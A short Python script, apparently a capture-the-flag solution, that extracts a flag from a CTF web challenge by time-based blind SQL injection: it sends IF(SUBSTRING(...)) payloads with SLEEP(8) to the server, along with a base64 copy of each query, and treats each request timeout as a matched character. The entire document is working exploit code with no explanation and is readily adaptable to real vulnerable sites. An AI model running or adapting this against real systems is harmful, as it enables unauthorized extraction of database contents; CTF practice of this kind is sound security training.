import base64
import requests
import string

flag = ""
position = 1
alphabet = string.ascii_letters + string.digits + string.punctuation
while True:
    letter_found = False
    for ch in alphabet:
        query = f"IF(SUBSTRING(flag, {position}, 1) = '{ch}', SLEEP(8), NULL) from flag"
        encoded_query = base64.b64encode(query.encode("ascii")).decode("ascii")
        params = {"query": query, "sig_query": encoded_query}
        try:
            requests.get("http://kslweb1.spb.ctf.su/sqli/time1/", params=params, timeout=3)
        except requests.exceptions.Timeout:
            flag += ch
            print(flag)
            letter_found = True
            break
    position += 1
    if not letter_found:
        break
print(f"Result = {flag}")